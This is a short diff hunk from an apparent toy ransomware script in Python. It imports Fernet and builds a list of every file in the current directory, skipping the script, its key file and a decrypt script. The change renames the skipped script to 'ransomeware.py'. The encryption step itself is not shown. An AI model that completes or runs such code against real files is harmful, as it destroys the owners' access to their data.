@@ -8,7 +8,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file == "reaperdeathseal.py" or file == "thekey.key" or file == "decrypt.py":
+	if file == "ransomeware.py" or file == "thekey.key" or file == "decrypt.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
